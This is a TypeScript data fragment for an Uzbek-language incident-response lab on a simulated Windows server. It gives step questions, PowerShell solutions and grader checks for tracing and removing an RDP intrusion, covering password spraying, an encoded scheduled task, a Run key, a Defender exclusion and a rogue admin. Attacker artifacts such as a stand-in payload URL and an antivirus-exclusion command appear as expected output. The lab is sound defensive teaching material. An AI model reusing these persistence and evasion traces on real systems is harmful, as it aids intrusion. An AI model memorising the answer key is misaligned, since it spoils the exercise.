      hint: '`$ev | Where-Object EventID -eq 4625 | Group-Object TargetUserName -NoElement` — bir IP dan ko\'p akkaunt: password spraying.',
      solution: ['$ev | Where-Object EventID -eq 4625 | Group-Object TargetUserName -NoElement'],
      check: ({ output }) => output.includes('administrator') && new RegExp(`${SIEM_SVC_FAILS} svc_backup`).test(output),
    },
    {
      id: 'login',
      text: 'Hujumchi IP sidan muvaffaqiyatli kirish qachon, qaysi akkaunt bilan bo\'lgan?',
      hint: `\`$ev | Where-Object { $_.EventID -eq 4624 -and $_.IpAddress -eq '${C2_IP}' } | Format-List TimeCreated, TargetUserName, LogonType\` — LogonType 10: RDP.`,
      solution: [`$ev | Where-Object { $_.EventID -eq 4624 -and $_.IpAddress -eq '${C2_IP}' } | Format-List TimeCreated, TargetUserName, LogonType`],
      check: ({ output }) => /TargetUserName : svc_backup/.test(output) && /LogonType\s+: 10/.test(output),
    },
    {
      id: 'service-log',
      text: "System jurnali tozalanmagan. Kechasi yangi xizmat o'rnatilganmi (7045)?",
      hint: "`Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} | Format-List TimeCreated, Message`",
      solution: [W`Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} | Format-List TimeCreated, Message`],
      check: ({ output }) => output.includes('WinUpdateSvc') && output.includes('C:\\Users\\Public\\svcupd.exe'),
    },
    {
      id: 'ps-log',
      text: "PowerShell jurnali (4104 — bajarilgan skript bloklari) hujumchining qaysi buyruqlarini saqlab qolgan?",
      hint: "`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} | Format-List TimeCreated, Message` — antivirus istisnosi va rejalashtirilgan vazifa.",
      solution: [W`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} | Format-List TimeCreated, Message`],
      check: ({ output }) => output.includes('Add-MpPreference -ExclusionPath C:\\Users\\Public') && output.includes('Register-ScheduledTask'),
    },
    {
      id: 'task',
      text: "Jurnalda ko'ringan `OneDriveSync` vazifasi nimani ishga tushiradi?",
      hint: '`(Get-ScheduledTask -TaskName OneDriveSync).Actions | Select-Object Execute, Arguments` — `-w hidden -enc`: yashirin oyna va Base64 bilan kodlangan buyruq.',
      solution: ['(Get-ScheduledTask -TaskName OneDriveSync).Actions | Select-Object Execute, Arguments'],
      check: ({ output }) => output.includes('powershell.exe') && output.includes('-enc'),
    },
    {
      id: 'decode',
      text: "Kodlangan buyruqni oching. `-enc` Base64 qabul qiladi, ichida UTF-16 (Unicode) matn. Argumentlarning oxirgi so'zini oling va dekodlang.",
      hint: "`$b64 = ((Get-ScheduledTask -TaskName OneDriveSync).Actions.Arguments -split ' ')[-1]`, keyin `[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))`",
      solution: [
        "$b64 = ((Get-ScheduledTask -TaskName OneDriveSync).Actions.Arguments -split ' ')[-1]",
        '[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))',
      ],
      check: ({ output }) => output.includes('http://update-cdn.example/u.bin'),
    },
    {
      id: 'run-key',
      text: 'Yana qayerdan qaytib kelishi mumkin? Avtomatik ishga tushish (Run) kalitini tekshiring.',
      hint: '`Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` — WinUpd.',
      solution: [W`Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run`],
      check: ({ output }) => output.includes('WinUpd') && output.includes('svcupd.exe'),
    },
    {
      id: 'exclusion',
      text: "PowerShell jurnalidagi antivirus istisnosi hamon turibdimi?",
      hint: '`Get-MpPreference | Select-Object -ExpandProperty ExclusionPath` — shuning uchun Defender faylni ko\'rmagan.',
      solution: ['Get-MpPreference | Select-Object -ExpandProperty ExclusionPath'],
      check: ({ output }) => output.trim() === 'C:\\Users\\Public',
    },
    {
      id: 'accounts',
      text: 'Administrators guruhida begona akkaunt bormi?',
      hint: '`Get-LocalGroupMember Administrators` — helpdesk2 kechasi 02:18 da yaratilgan.',
      solution: ['Get-LocalGroupMember Administrators'],
      check: ({ output }) => output.includes('SRV-FILE-01\\helpdesk2'),
    },
    {
      id: 'block',
      teach: ['New-NetFirewallRule -RemoteAddress', 'New-NetFirewallRule -Direction'],
      text: "Cheklash: hujumchi manzili bilan aloqani ikki yo'nalishda ham uzing — chiquvchi va kiruvchi bloklash qoidalari.",
      hint: `\`New-NetFirewallRule -DisplayName 'Block C2 out' -Direction Outbound -Action Block -RemoteAddress ${C2_IP}\`, keyin xuddi shunisi \`-Direction Inbound\` bilan.`,
      solution: [
        `New-NetFirewallRule -DisplayName 'Block C2 out' -Direction Outbound -Action Block -RemoteAddress ${C2_IP}`,
        `New-NetFirewallRule -DisplayName 'Block C2 in' -Direction Inbound -Action Block -RemoteAddress ${C2_IP}`,
      ],
      check: ({ state }) =>
        ['Outbound', 'Inbound'].every((d) => state.win!.firewall.some((r) => r.direction === d && r.action === 'Block' && r.enabled && (r.remoteAddress ?? '').split(',').includes(C2_IP))),
    },
    {
      id: 'service',
      teach: ['Stop-Service -Force', 'Remove-Service'],
      text: "Yo'q qilish: zararli xizmatni to'xtating (jarayon ham to'xtaydi) va xizmatni butunlay o'chiring.",
      hint: '`Stop-Service WinUpdateSvc -Force`, keyin `Remove-Service WinUpdateSvc`',
      solution: ['Stop-Service WinUpdateSvc -Force', 'Remove-Service WinUpdateSvc'],
      check: ({ state }) => !state.win!.services.some((s) => s.name === 'WinUpdateSvc') && !state.win!.processes.some((p) => p.id === 4120),
    },
    {
      id: 'persistence',
      teach: ['Unregister-ScheduledTask', 'Unregister-ScheduledTask -Confirm:$false'],
      text: "Qolgan ikki qaytish yo'lini yoping: `OneDriveSync` vazifasini va Run kalitidagi `WinUpd` ni o'chiring.",
      hint: '`Unregister-ScheduledTask -TaskName OneDriveSync -Confirm:$false`, keyin `Remove-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name WinUpd`',
      solution: ['Unregister-ScheduledTask -TaskName OneDriveSync -Confirm:$false', W`Remove-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name WinUpd`],
      check: ({ state }) => {
        const run = state.win!.registry.get('hklm:\\software\\microsoft\\windows\\currentversion\\run');
        return !state.win!.tasks.some((t) => t.name === 'OneDriveSync') && !!run && !('WinUpd' in run.values);
      },
    },
    {
      id: 'accounts-fix',
      text: "Akkauntlar: `helpdesk2` ni Administrators dan chiqaring, `helpdesk2` va buzilgan `svc_backup` ni bloklang.",
      hint: '`Remove-LocalGroupMember -Group Administrators -Member helpdesk2`, keyin `Disable-LocalUser -Name helpdesk2, svc_backup` (svc_backup paroli keyin almashtiriladi).',
      solution: ['Remove-LocalGroupMember -Group Administrators -Member helpdesk2', 'Disable-LocalUser -Name helpdesk2, svc_backup'],
      check: ({ state }) =>
        !state.win!.groups.find((g) => g.name === 'Administrators')!.members.includes('helpdesk2') &&
        state.win!.users.filter((u) => ['helpdesk2', 'svc_backup'].includes(u.name)).every((u) => !u.enabled),
    },
    {
      id: 'defender',
      text: "Antivirus istisnosini olib tashlang, `C:\\Users\\Public` ni tekshiring va natijani ko'ring.",
      hint: "`Remove-MpPreference -ExclusionPath 'C:\\Users\\Public'`, `Start-MpScan -ScanPath C:\\Users\\Public`, keyin `Get-MpThreat`",
      solution: [W`Remove-MpPreference -ExclusionPath 'C:\Users\Public'`, W`Start-MpScan -ScanPath C:\Users\Public`, 'Get-MpThreat'],
      check: ({ state, output }) => state.win!.defender.exclusionPaths.length === 0 && output.includes('Backdoor:Win64/Lab.Rdpdoor') && nodeAt(state, '/Users/Public/svcupd.exe') === null,
    },
    {
      id: 'challenge',
      challenge: true,
      text: "Mustaqil vazifa: tozalashdan keyingi tekshiruvni `C:\\IR\\yakuniy.txt` ga yozing — avval barcha TCP ulanishlar, keyin Administrators a'zolari. Faylda hujumchi manzili, 4444-port va helpdesk2 bo'lmasligi kerak.",
      hint: "Ikki buyruq: biri faylni yaratadi, ikkinchisi `-Append` bilan qo'shadi.",
      solution: [W`Get-NetTCPConnection | Out-File C:\IR\yakuniy.txt`, W`Get-LocalGroupMember Administrators | Out-File C:\IR\yakuniy.txt -Append`],
      check: ({ state }) => {
        const t = fileAt(state, '/IR/yakuniy.txt') ?? '';
        return t.includes('3389') && t.includes('SRV-FILE-01\\ir-analyst') && !t.includes(C2_IP) && !t.includes('4444') && !t.includes('helpdesk2');
      },
    },
  ],
};
